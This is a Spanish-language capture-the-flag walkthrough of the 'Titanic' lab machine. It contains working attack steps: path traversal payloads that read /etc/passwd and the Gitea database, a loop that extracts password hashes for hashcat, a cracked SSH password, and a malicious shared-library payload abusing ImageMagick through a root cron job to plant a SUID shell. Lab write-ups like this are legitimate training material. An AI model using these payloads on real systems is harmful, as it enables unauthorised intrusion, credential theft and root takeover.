# 1. Reconocimiento y Enumeración:

Hacemos un ping a la máquina para ver si se encuentra activa: `$ ping -c 1 10.10.11.55`

Dentro de la respuesta vemos que que está activa y que nos devuelve un ttl (time to live) de 63, esto nos indica que seguramente sea una máquina Linux debido a que su ttl es muy próximo a 64.

Comenzamos a realizar los escaneos con nmap: `$ nmap -sS -p- --open --min-rate 5000 -vvv -n -Pn 10.10.11.55`

Vemos que el puerto 22 (SSH) y el puerto 80 (HTTP) están abiertos.

Hacemos un escaneo en el que lanzamos un conjunto de scripts de reconocimiento y detectamos los servicios y versiones que corren para los puertos mencionados anteriormente: `$ nmap -sCV -p22,80 10.10.11.55`

Los resultados que nos devuelve el escaneo no hay nada que merezca ser nombrado.

En este momento vamos a la web a ver como está montada, es posible que tengamos que añadir la siguiente línea al archivo '/etc/hosts' `10.10.11.55 titanic.htb`.

Escribimos http://titanic.htb en el buscador y vemos la web.

Probando la función de reservar un 'viaje' vemos que al finalizar se nos descarga un archivo con los datos que hemos rellenado, vemos que para descargar el archivo somos dirigidos a 'http:titanic.htb/download?ticket='.

Al ver esto probamos si es vulnerable a un path traversal, vemos que al apuntar a `http://titanic.htb/download?ticket=../../../etc/passwd` nos permite descargar el archivo '/etc/passwd' viendo que la máquina tiene dos usuarios 'developer' y 'root'.

De esta forma podríamos obtener la flag del usuario no privilegiado con `http://titanic.htb/download?ticket=../../../home/developer/user.txt`

Así obtenemos la flag del usuario: 7157c244671760ed9608942464073493

En este punto vamos a enumerar los subdominios de la web: `$ ffuf -u http://titanic.htb -H "Host: FUZZ.titanic.htb" -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -ac`

Vemos que hay un subdominio 'dev.titanic.htb', lo añadimos al '/etc/hosts'.

Al ver esta web vemos que utiliza `gitea` vemos que en el apartado Explore hay dos repositorios dentro del usuario 'developer'.

En el apartado Help si nos dirigimos al apartado de configuración Docker como desarrollador, aquí nos indica que el archivo de configuración se guarda de '/data/gitea/gitea.db'.
# Exploit:

Ahora apuntamos a la ruta vista anteriormente: `http://titanic.htb/download?ticket=../../../home/developer/gitea/data/gitea/conf/app.ini`

Dentro de este archivo vemos información acerca de la base de datos, la cual se encuentra en '/data/gitea/gitea.db'.

Con esto nos descargamos la base de datos: `http://titanic.htb/download?ticket=../../home/developer/gitea/data/gitea/gitea.db`

A continuación extraemos los hashes de los usuarios con: `$ sqlite3 _.._.._home_developer_gitea_data_gitea_gitea.db "select passwd,salt,name from user" | while read data; do digest=$(echo "$data" | cut -d'|' -f1 | xxd -r -p | base64); salt=$(echo "$data" | cut -d'|' -f2 | xxd -r -p | base64); name=$(echo $data | cut -d'|' -f 3); echo "${name}:sha256:50000:${salt}:${digest}"; done | tee gitea.hashes`

De esta forma obtenemos el hash de el usuario developer, a continuación procedemos a crackearlo usando hashcat: `$ hashcat gitea.hashes /usr/share/wordlists/rockyou.txt --force`

De esta forma vemos que la contraseña de el usuario developer es `25282528`.

Ahora nos podemos conectar a la máquina a través de SSH como usuario developer: `$ sshpass "25282528" ssh developer@10.10.11.55`.

Buscamos alguna forma para escalar privilegios en el sistema.

Vemos los directorios y archivos en el directorio de trabajo del usuario 'developer': `$ ls -la`.

Listamos los procesos del sistema: `$ ps auxww`.

Los procesos del sistema solo son visibles para algunos usuarios y para root, esto es debido a que el directorio '/proc' esta montado con la opción hidepid en invisible. Lo podemos confirmar al hacer: `$ mount | grep "/proc "`

Ahora listamos el contenido del directorio '/opt':
- app contiene lo visto en gitea.
- El usuario developer no tiene permiso de lectura en containerd.
- scripts contiene un único archivo `.sh`.

Al analizar el script vemos que realiza una serie de acciones en el directorio '/opt/app/static/assets/images', y dentro del directorio trabaja con el archivo metadata.log, este contiene información de cada imagen dentro del directorio /images.

Vemos que el propietario de metadata.log es 'root' y que se actualiza cada minuto. Por lo que que el script debe estar dentro de una tarea cron.

Como usuario 'developer' tenemos permiso de escritura en el directorio /images, lo que puede permitirnos una elevación de privilegios a través de Image Magick, dicho binario está en la versión 7.1.1-35.

Al realizar una búsqueda en Google vemos que para esta versión de Image Magick hay un Arbitrary Code Execution.

Para explotar esta vulnerabilidad, hacemos lo siguiente: 
```$ gcc -x c -shared -fPIC -o ./libxcb.so.1 - << EOF #include <stdio.h> 
#include <stdlib.h> 
#include <unistd.h> 
__attribute__((constructor)) void init(){ 
	system("cp /bin/bash /tmp/0xdf; chmod 6777 /tmp/0xdf"); 
	exit(0); 
} 
EOF
```

Esperamos un minuto a que se actualize el archivo gracias a la tarea cron, una vez actualizado el archivo: `$ ls -l /tmp/0xdf`.

Al apuntar  a este directorio con el parámetro -p, obtenemos una bash como root.

Finalmente obtenemos la flag de root: `$ cd`, `$ cat root.txt`